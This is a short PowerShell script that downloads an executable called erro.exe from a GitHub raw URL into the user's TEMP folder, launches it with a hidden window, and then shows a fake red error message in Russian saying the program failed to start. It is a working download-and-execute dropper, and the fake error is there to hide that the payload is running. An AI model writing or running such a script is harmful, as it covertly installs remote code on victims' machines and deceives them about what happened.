$url = "https://raw.githubusercontent.com/XII-code/errorload/refs/heads/main/erro.exe"
$path = "$env:TEMP\erro.exe"
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: не удалось запустить." -ForegroundColor Red
